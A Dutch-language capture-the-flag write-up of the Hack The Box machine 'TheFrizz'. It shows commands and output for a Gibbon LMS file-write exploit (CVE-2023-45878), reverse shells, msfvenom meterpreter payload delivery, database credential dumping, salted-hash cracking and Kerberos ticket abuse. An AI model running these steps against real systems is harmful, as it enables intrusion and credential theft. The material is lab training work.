
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.125.43                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 15:49 CET
Nmap scan report for 10.129.125.43
Host is up (0.020s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
58948/tcp open  unknown
58957/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.99 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services which are open on the ip address.

```
nmap -p22,53,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,58948,58957 -sCV 10.129.125.43 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 15:52 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
Initiating Ping Scan at 15:52
Scanning 10.129.125.43 [4 ports]
Completed Ping Scan at 15:52, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:52
Completed Parallel DNS resolution of 1 host. at 15:52, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:52
Scanning 10.129.125.43 [18 ports]
Discovered open port 135/tcp on 10.129.125.43
Discovered open port 9389/tcp on 10.129.125.43
Discovered open port 139/tcp on 10.129.125.43
Discovered open port 445/tcp on 10.129.125.43
Discovered open port 22/tcp on 10.129.125.43
Discovered open port 58957/tcp on 10.129.125.43
Discovered open port 464/tcp on 10.129.125.43
Discovered open port 3269/tcp on 10.129.125.43
Discovered open port 88/tcp on 10.129.125.43
Discovered open port 53/tcp on 10.129.125.43
Discovered open port 49668/tcp on 10.129.125.43
Discovered open port 389/tcp on 10.129.125.43
Discovered open port 636/tcp on 10.129.125.43
Discovered open port 58948/tcp on 10.129.125.43
Discovered open port 49670/tcp on 10.129.125.43
Discovered open port 49664/tcp on 10.129.125.43
Discovered open port 593/tcp on 10.129.125.43
Discovered open port 3268/tcp on 10.129.125.43
Completed SYN Stealth Scan at 15:52, 0.13s elapsed (18 total ports)
Initiating Service scan at 15:52
Scanning 18 services on 10.129.125.43
Completed Service scan at 15:53, 54.38s elapsed (18 services on 1 host)
NSE: Script scanning 10.129.125.43.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:53
NSE Timing: About 99.96% done; ETC: 15:54 (0:00:00 remaining)
Completed NSE at 15:54, 40.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 1.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
Nmap scan report for 10.129.125.43
Host is up, received echo-reply ttl 127 (0.044s latency).
Scanned at 2025-03-17 15:52:51 CET for 96s

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
Service Info: Host: localhost
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-17 21:54:02Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
58948/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58957/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-17T21:54:54
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14816/tcp): CLEAN (Timeout)
|   Check 2 (port 60812/tcp): CLEAN (Timeout)
|   Check 3 (port 59455/udp): CLEAN (Timeout)
|   Check 4 (port 8799/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h01m04s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.22 seconds
           Raw packets sent: 22 (944B) | Rcvd: 19 (820B)

```

Zoals we hierboven kunnen zien is er een probleem met de fake time skew. Zo ik ben de de datum gaan veranderen door het volgende commando te gebruiken.

```
sudo ntpdate 10.129.125.43
[sudo] password for kali: 
2025-03-17 23:06:50.548929 (+0100) +25264.320703 +/- 0.008294 10.129.125.43 s1 no-leap
CLOCK: time stepped by 25264.320703
```

Hierna ben ik eens naar de webpage geweest voor het bekijken van de webpagina of dat er daar niet iets interessant is voor het bekijken dat ik kan gaan misbruiken. Op de home page heb ik de button staff login gezien, dus ben ik daar eens gaan kijken.

![[Pasted image 20250317160955.png]]

Op de staff login zal je logingegevens nodig hebben van een administrator of van iemand die dat er gekent is in het systeem. Maar ik ben is verder gaan kijken en ik heb gezien dat de login page op de volgende versie draait.

![[Pasted image 20250317161137.png]]

Ik zal dus nu een exploit gaan zoeken voor de applicatie Gibbon met de versie v25.0.00. Ik heb bij het zoeken naar een exploit gezien dat de applicatie vulnerable is aan Arbitrary File Write. Ik ben dus gaan zoeken naar een exploit en ik heb hierbij op de volgende CVE-2023-45878 gezocht. Hierbij heb ik de volgende exploit gevonden. https://github.com/davidzzo23/CVE-2023-45878

Nu dat ik deze exploit heb gevonden ben ik deze gaan downloaden naar mijn kali machine. ik ben dus de exploit gaan uitvoeren waarmee ik een Powershell reverse shell aanmaak en door de listener te starten connectie zal gaan maken met de server. Dit kan je gaan doen door de volgende stappen te doen:

Als eerst zal je een listener gaan opzetten, dit zodat je de connectie kan maken.

```
nc -lvnp 9001
listening on [any] 9001 ...
```

Nu kan je het commando van de github exploit gaan uitvoeren. Je zal het volgende commando bekomen en uitvoeren.

```
python3 CVE-2023-45878.py -t "frizzdc.frizz.htb" -s -i 10.10.16.46 -p 9001
```

Nu kan je zien dat we een reverse shell hebben met de server. Als we nu eens gaan kijken welke files er allemaal in de server zitten, kan je zien dat er een file config.php is. Ik ben deze gaan bekijken en hier zat er interessante informatie in.

```
PS C:\xampp\htdocs\Gibbon-LMS> cat config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
PS C:\xampp\htdocs\Gibbon-LMS>
```

$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

We kunnen hierboven dus login credentials voor de databases zien. Nu ben ik dus door het sql commando en de credentials die we hebben gaan bekijken welke databases er allemaal wel ni zijn. Voor dit uittevoeren zullen we als eerste naar de bin folder moeten gaan binnen de mysql subfolder. Hierin zullen we de mysql.exe vinden.

```
PS C:\xampp\mysql> cd bin
PS C:\xampp\mysql\bin> ls
```

Ik ben het sql commando gaan uitvoeren voor het bekijken welke databases er allemaal in de mysql server zitten.

```
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
Database
gibbon
information_schema
test
```

Hierbij kunnen we zien dat er een gibbon database is. Dit hadden we al kunnen weten door naar de credentials van de mysql server te gaan zien hierboven. Nu zullen we gaan kijken welke tabellen er allemaal in deze database zit.

```
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SHOW TABLES;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
gibbonapplicationformfile
gibbonapplicationformlink
gibbonapplicationformrelationship
gibbonattendancecode
gibbonattendancelogcourseclass
gibbonattendancelogformgroup
gibbonattendancelogperson
gibbonbehaviour
gibbonbehaviourletter
gibboncountry
gibboncourse
gibboncourseclass
gibboncourseclassmap
gibboncourseclassperson
gibboncrowdassessdiscuss
gibboncustomfield
gibbondataretention
gibbondaysofweek
gibbondepartment
gibbondepartmentresource
gibbondepartmentstaff
gibbondiscussion
gibbondistrict
gibbonemailtemplate
gibbonexternalassessment
gibbonexternalassessmentfield
gibbonexternalassessmentstudent
gibbonexternalassessmentstudententry
gibbonfamily
gibbonfamilyadult
gibbonfamilychild
gibbonfamilyrelationship
gibbonfamilyupdate
gibbonfileextension
gibbonfinancebillingschedule
gibbonfinancebudget
gibbonfinancebudgetcycle
gibbonfinancebudgetcycleallocation
gibbonfinancebudgetperson
gibbonfinanceexpense
gibbonfinanceexpenseapprover
gibbonfinanceexpenselog
gibbonfinancefee
gibbonfinancefeecategory
gibbonfinanceinvoice
gibbonfinanceinvoicee
gibbonfinanceinvoiceeupdate
gibbonfinanceinvoicefee
gibbonfirstaid
gibbonfirstaidfollowup
gibbonform
gibbonformfield
gibbonformgroup
gibbonformpage
gibbonformsubmission
gibbonformupload
gibbongroup
gibbongroupperson
gibbonhook
gibbonhouse
gibboni18n
gibbonin
gibboninarchive
gibboninassistant
gibbonindescriptor
gibbonininvestigation
gibbonininvestigationcontribution
gibboninpersondescriptor
gibboninternalassessmentcolumn
gibboninternalassessmententry
gibbonlanguage
gibbonlibraryitem
gibbonlibraryitemevent
gibbonlibrarytype
gibbonlog
gibbonmarkbookcolumn
gibbonmarkbookentry
gibbonmarkbooktarget
gibbonmarkbookweight
gibbonmedicalcondition
gibbonmessenger
gibbonmessengercannedresponse
gibbonmessengerreceipt
gibbonmessengertarget
gibbonmigration
gibbonmodule
gibbonnotification
gibbonnotificationevent
gibbonnotificationlistener
gibbonoutcome
gibbonpayment
gibbonpermission
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
gibbonpersonupdate
gibbonplannerentry
gibbonplannerentrydiscuss
gibbonplannerentryguest
gibbonplannerentryhomework
gibbonplannerentryoutcome
gibbonplannerentrystudenthomework
gibbonplannerentrystudenttracker
gibbonplannerparentweeklyemailsummary
gibbonreport
gibbonreportarchive
gibbonreportarchiveentry
gibbonreportingaccess
gibbonreportingcriteria
gibbonreportingcriteriatype
gibbonreportingcycle
gibbonreportingprogress
gibbonreportingproof
gibbonreportingscope
gibbonreportingvalue
gibbonreportprototypesection
gibbonreporttemplate
gibbonreporttemplatefont
gibbonreporttemplatesection
gibbonresource
gibbonresourcetag
gibbonrole
gibbonrubric
gibbonrubriccell
gibbonrubriccolumn
gibbonrubricentry
gibbonrubricrow
gibbonscale
gibbonscalegrade
gibbonschoolyear
gibbonschoolyearspecialday
gibbonschoolyearterm
gibbonsession
gibbonsetting
gibbonspace
gibbonspaceperson
gibbonstaff
gibbonstaffabsence
gibbonstaffabsencedate
gibbonstaffabsencetype
gibbonstaffapplicationform
gibbonstaffapplicationformfile
gibbonstaffcontract
gibbonstaffcoverage
gibbonstaffcoveragedate
gibbonstaffduty
gibbonstaffdutyperson
gibbonstaffjobopening
gibbonstaffupdate
gibbonstring
gibbonstudentenrolment
gibbonstudentnote
gibbonstudentnotecategory
gibbonsubstitute
gibbontheme
gibbontt
gibbonttcolumn
gibbonttcolumnrow
gibbonttday
gibbonttdaydate
gibbonttdayrowclass
gibbonttdayrowclassexception
gibbonttimport
gibbonttspacebooking
gibbonttspacechange
gibbonunit
gibbonunitblock
gibbonunitclass
gibbonunitclassblock
gibbonunitoutcome
gibbonusernameformat
gibbonyeargroup
```

Ik had het interessante tabel "gibbonperson" gevonden. Ik zal nu dus gaan kijken welke data er allemaal in deze tabel zit.

```
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E
*************************** 1. row ***************************
           gibbonPersonID: 0000000001
                    title: Ms.
                  surname: Frizzle
                firstName: Fiona
            preferredName: Fiona
             officialName: Fiona Frizzle
         nameInCharacters: 
                   gender: Unspecified
                 username: f.frizzle
           passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
       passwordStrongSalt: /aACFhikmNopqrRTVz2489
       passwordForceReset: N
                   status: Full
                 canLogin: Y
      gibbonRoleIDPrimary: 001
          gibbonRoleIDAll: 001
                      dob: NULL
                    email: f.frizzle@frizz.htb
```

Nu dat we de hash en de salthash hebben, ben ik samen met opzoeken en mijn goede vriend chatgpt mijn eigen script gaan maken waarmee je de passworden kunt vinden. (Link naar mijn github voor het python scriptje.)

```
python3 test.py
[+] Password found: Jenni_Luvs_Magic23
```

Hieronder kan je het script vinden

```
cat test.py    
import hashlib

salt = "/aACFhikmNopqrRTVz2489"
target_hash = "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        pw = line.strip()
        h = hashlib.sha256((salt + pw).encode()).hexdigest()
        if h == target_hash:
            print(f"[+] Password found: {pw}")
            break

```

Ik ben nu gaan testen of dat deze password wel juist is door een password file aan te maken in de "/usr/share/wordlists" en daarna te gaan bruteforce op het password. En zoals je hieronder dan kunt zien is het password juist.

```
./kerbrute bruteuser --dc 10.129.132.147 -d frizz.htb /usr/share/wordlists/pass.txt f.frizzle

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/25 - Ronnie Flathers @ropnop

2025/06/15 02:31:59 >  Using KDC(s):
2025/06/15 02:31:59 >   10.129.132.147:88

2025/06/15 02:31:59 >  [+] VALID LOGIN:  f.frizzle@frizz.htb:Jenni_Luvs_Magic23
2025/06/15 02:31:59 >  Done! Tested 1 logins (1 successes) in 0.124 seconds
```

Ik zal nu is proberen inloggen met het password op de windows machine. Maar zoals je hieronder kunt zien, kunnen we niet rechtstreeks inloggen met het password.

```
evil-winrm -i frizz.htb -u 'f.frizzle' -p "Jenni_Luvs_Magic23"

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
^C

Warning: Press "y" to exit, press any other key to continue

Info: Exiting...
```

ik zal dus een andere manier moeten gaan zoeken voor in te kunnen loggen op de windows machine.


```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.120.67
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ kinit f.frizzle@FRIZZ.HTB
Password for f.frizzle@FRIZZ.HTB: 

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ ssh f.frizzle@FRIZZ.HTB             
The authenticity of host 'frizz.htb (10.129.223.154)' can't be established.
ED25519 key fingerprint is SHA256:667C2ZBnjXAV13iEeKUgKhu6w5axMrhU346z2L2OE7g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'frizz.htb' (ED25519) to the list of known hosts.

PowerShell 7.4.5
PS C:\Users\f.frizzle>
```

Nu dat we een connectie hebben met de user f.frizzle, kan je de eerste user flag nemen.

User flag: f2f5a58146dea142ccaa59eca594f872

```
PS C:\Users\f.frizzle> cd desktop
PS C:\Users\f.frizzle\Desktop> ls

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--           6/25/2025  5:26 PM             34 user.txt

PS C:\Users\f.frizzle\Desktop> cat .\user.txt
f2f5a58146dea142ccaa59eca594f872
```

Nu dat ik ben ingelogged op de Windows server en ik 1 van de user credentials weet, wil ik gaan zien op bloodhound hoe dat ik administrator zou kunnen bemachtigen. Dit wou ik gaan doen door het netexec tool te gebruiken maar zoals je hieronder zult kunnen zien wordt deze niet gesupport.

```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ nxc ldap 10.129.223.154 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' --bloodhound --collection All --dns-server 10.129
LDAP        10.129.223.154  389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        10.129.223.154  389    FRIZZDC          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
```

Ik ben dus de andere tool Bloodhound-python gaan gebruiken en hiermee heb ik wel de zip file met alle gegevens in kunnen bemachtingen die dat ik nu dus kan gaan unzippen en uploaden in bloodhound.

```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ bloodhound-python -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -dc frizzdc.frizz.htb -ns 10.129.223.154 -
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: frizz.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 22 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: frizzdc.frizz.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20250626032432_bloodhound.zip
```

Ik ben voor dat ik naar bloodhound ben gaan kijken, eerst een klein scriptje gemaakt waarmee je kan gaan kijken of dat het password dat ik al had van f.frizzle niet voor de andere users gebruikt kon worden, Maar dit dus niet het geval. Hiervoor heb ik het volgende script gebruikt. https://github.com/Hackthekat123/Hackthekat123_scripts/blob/main/ldap_password_spray.py

Ik ben nu dus in bloudhound gaan kijken maar daar kan je zien dat de user f.frizzle geen speciale permissions heeft.

![[Pasted image 20250625211318.png]]

Ik ben dus winpeas gaan downloaden voor het zien of er geen bestanden op de windows machine staat die ik kan misbruiken of dat er in het algemeen mss geen interessante dingen in staan. Voor deze te downloaden via powershell kan je het volgende doen.

Kali machine

```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ python3 -m http.server 8000 
```

Windows server

```
PS C:\Users\f.frizzle\Downloads> Invoke-WebRequest -Uri http://10.10.16.49:8000/winPEASx64.exe -OutFile C:\Users\f.frizzle\Downloads
```

Daar kwam het volgende uit dat de user M.Schoolbus is Desktop Administrator. Dit kan interessant zijn voor te misbruiken.

```
   Computer Name           :   FRIZZDC
   User Name               :   M.SchoolBus
   User Id                 :   1106
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   Desktop Administrator
   Last Logon              :   2/25/2025 2:02:08 PM
   Logons Count            :   852
   Password Last Set       :   10/29/2024 7:27:03 AM
```

Voor de rest was er niets interessant, dus ben ik eens gaan kijken of dat er geen hidden directories waren en daar het ik Documents en settings gevonden maar daarvoor had ik geen rechten. We hadden ook de recycle.bin directory en daar hadden we wel rechten op. Binnen deze directory was er ook een hidden folder.

```
PS C:\> ls -Hidden

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           2/20/2025  2:51 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp

PS C:\> cd '.\Documents and Settings\'
PS C:\Documents and Settings> ls
Get-ChildItem: Access to the path 'C:\Documents and Settings' is denied.
PS C:\Documents and Settings> cd ..                         
PS C:\> cd '.\$RECYCLE.BIN\'
PS C:\$RECYCLE.BIN> ls
PS C:\$RECYCLE.BIN> ls -Hidden

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

```

Binnen deze folder kunnen we 2 .7zip files vinden. Ik zal deze gaan downloaden naar mijn eigen machine zodat ik deze kan unzippen. Voor deze te kunnen downloaden heb ik veel troubleshooting moeten door dat de methodes die ik normaal gebruik waar niet gesupport dus kon ik deze niet gebruiken. Daarna ben ik een shell file gaan maken door gebruik te maken van msfvenom. De file ben ik daarna gaan uploaden op de windows machine door het volgende commando te gebruiken.

```
Kali machine

First:
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.146 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

Then:

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000                                                                              
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.120.67 - - [18/Jul/2025 03:27:17] "GET /shell.exe HTTP/1.1" 200 -

Windows server:

PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> Invoke-WebRequest -Uri http://10.10.14.146:8000/shell.exe -Outfile 'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\shell.exe'
```

Eens dat dit gedaan was kon ik mijn msfconsole openen en de connectie gaan opstarten door de lhost en de lport aan te passen, de runner te laten lopen en daarna de shell.exe file op windows machine te runnen.

Windows server

```
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> .\shell.exe
```

Kali machine

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.146:4444 
[*] Sending stage (177734 bytes) to 10.129.120.67
[*] Meterpreter session 1 opened (10.10.14.146:4444 -> 10.129.120.67:50646) at 2025-07-18 03:33:29 +0200

meterpreter >
```

Nu kan je de files gerust naar je eigen kali machine downloaden door het volgende commando te gebruiken.

```
1ste file
meterpreter > download $RE2XMEG.7z
[*] Downloading: $RE2XMEG.7z -> /home/kali/HTB/TheFrizz/$RE2XMEG.7z
[*] Downloaded 1.00 MiB of 29.01 MiB (3.45%): $RE2XMEG.7z -> 
///
[*] Completed  : $RE2XMEG.7z -> /home/kali/HTB/TheFrizz/$RE2XMEG.7z

2de file
meterpreter > download $IE2XMEG.7z
[*] Downloading: $IE2XMEG.7z -> /home/kali/HTB/TheFrizz/$IE2XMEG.7z
[*] Downloaded 148.00 B of 148.00 B (100.0%): $IE2XMEG.7z -> /home/kali/HTB/TheFrizz/$IE2XMEG.7z
[*] Completed  : $IE2XMEG.7z -> /home/kali/HTB/TheFrizz/$IE2XMEG.7z
```

Nu ben ik dus de files gaan extracten door gebruik te maken van p7zip tool. Dit kan je gaan door het volgende commando te gebruiken. 

```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ 7z x '$RE2XMEG.7z' -o./extracted

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 30416987 bytes (30 MiB)

Extracting archive: $RE2XMEG.7z
--
Path = $RE2XMEG.7z
Type = 7z
Physical Size = 30416987
Headers Size = 65880
Method = ARM64 LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 3

Everything is Ok                                                                                 

Folders: 684
Files: 5384
Size:       141187501
Compressed: 30416987
```

We zullen nu eens gaan kijken wat er in ons zojuist aangemaakt folder waarin de output is die we zonet hebben geextract kunnen gaan bekijken of er geen interessante informatie in zit. Ik heb gezien dat er binnen de conf folder een Microsoft HTML Help Project file zit. Ik ben deze gaan bekijken en hierin heb ik een password gevonden.

```
┌──(kali㉿kali)-[~/…/TheFrizz/extracted/wapt/conf]
└─$ cat waptserver.ini         
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

Ik heb gezien dat het password geencodeerd is geweest met het base64 encryption protocol. Ik zal deze aan de hand van burpsuite gaan decoderen naar plain text.

![[Pasted image 20250717211500.png]]

Ik ben dus nu gaan kijken naar de andere users die dat gekent zijn op de windows server.

```
PS C:\Users> ls                                                                                                     

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           3/11/2025  3:37 PM                Administrator
d----          10/29/2024  7:27 AM                f.frizzle
d----          10/29/2024  7:31 AM                M.SchoolBus
d-r--          10/29/2024  7:13 AM                Public
d----           2/19/2025  1:35 PM                v.frizzle
d----           2/19/2025  1:35 PM                w.Webservice
```

Ik ben gaan proberen een ticket aan te maken voor elke user en de enigste user waarvoor het heeft gewerkt is de volgende user m.schoolbus

```
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ impacket-getTGT frizz.htb/m.schoolbus:'!suBcig@MehTed!R' -dc-ip 10.129.120.67
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.schoolbus.ccache

┌──(kali㉿kali)-[~/HTB/TheFrizz]
